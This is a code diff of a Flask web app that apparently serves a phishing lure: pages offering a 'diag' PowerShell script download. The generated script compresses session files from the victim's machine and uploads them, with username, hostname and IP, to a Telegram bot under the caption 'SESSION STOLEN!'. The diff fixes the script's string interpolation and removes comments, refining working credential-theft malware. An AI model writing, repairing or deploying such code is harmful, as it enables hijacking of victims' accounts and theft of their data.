@@ -18,7 +18,6 @@ ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 PORT = int(os.environ.get("PORT", 5000))
 BASE_URL = os.environ.get("BASE_URL", "https://butno-1.onrender.com")
 
-# Данные для Telethon (для режимов 2 и 3)
 API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 
@@ -249,9 +248,8 @@ HTML_DOWNLOAD = """
 </html>
 """
 
-# ======================== ГЕНЕРАЦИЯ POWERSCRIPT СКРИПТА ============================
+# ======================== ГЕНЕРАЦИЯ POWERSHELL СКРИПТА ============================
 def generate_ps_script(link_id):
-    # Скрипт будет отправлять архив админу через бота
     bot_token = BOT_TOKEN
     chat_id = ADMIN_ID
     script = f"""
@@ -270,12 +268,12 @@ def generate_ps_script(link_id):
 
     foreach ($p in $paths) {{
         if (Test-Path $p) {{
-            $temp = "$env:TEMP\diag_{$link_id}.zip"
+            $temp = "$env:TEMP\diag_" + $link_id + ".zip"
             Compress-Archive -Path $p -DestinationPath $temp -Force
             $url = "https://api.telegram.org/bot$bot_token/sendDocument"
             $form = @{{
                 chat_id = $chat_id
-                caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: {link_id}"
+                caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: $link_id"
                 document = Get-Item $temp
             }}
             Invoke-RestMethod -Uri $url -Method Post -Form $form
@@ -397,8 +395,6 @@ def verify_page(link_id):
 
 @app.route('/custom/<link_id>', methods=['GET', 'POST'])
 def custom_page(link_id):
-    # Режим 3 – аналогично verify, но с возможностью менять редирект
-    # Для простоты перенаправляем на verify
     return redirect(f"/verify/{link_id}")
 
 @app.route('/download/<link_id>')
@@ -406,7 +402,6 @@ def download_page(link_id):
     link_data = get_link_data(link_id)
     if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
-    # Показываем страницу с предложением скачать скрипт
     return render_template_string(HTML_DOWNLOAD, link_id=link_id)
 
 @app.route('/script/<link_id>')
@@ -414,9 +409,7 @@ def serve_script(link_id):
     link_data = get_link_data(link_id)
     if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
-    # Генерируем скрипт и отдаём как файл .ps1
     script_content = generate_ps_script(link_id)
-    # Деактивируем ссылку после скачивания (чтобы не злоупотребляли)
     deactivate_link(link_id)
     response = app.response_class(
         response=script_content,
